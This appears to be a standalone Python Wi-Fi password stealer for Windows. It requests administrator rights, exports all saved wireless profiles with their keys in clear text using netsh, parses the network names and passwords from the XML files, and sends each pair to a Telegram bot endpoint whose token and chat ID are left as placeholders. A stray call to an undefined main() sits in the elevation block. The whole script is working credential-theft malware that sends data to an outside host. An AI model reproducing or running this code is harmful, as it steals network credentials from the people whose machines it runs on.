from xml.dom import minidom
import os
import requests
import subprocess
import ctypes
import sys
import psutil

if ctypes.windll.shell32.IsUserAnAdmin():
    if __name__ == "__main__":
        main()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

subprocess.call("netsh wlan show profile")
subprocess.call("netsh wlan export profile folder=C:\\ key=clear")

for file in os.listdir("C:/"):
    if file.endswith(".xml"):
        document = minidom.parse(f"C:/{file}")
        wifi = {
            "name": document.getElementsByTagName("name")[0].firstChild.data,
            "password": document.getElementsByTagName("keyMaterial")[0].firstChild.data
        }

        # print(wifi)
        requests.post(
            f"https://api.telegram.org/You_token/sendMessage?chat_id=YOUR_CHATID&text={wifi}")
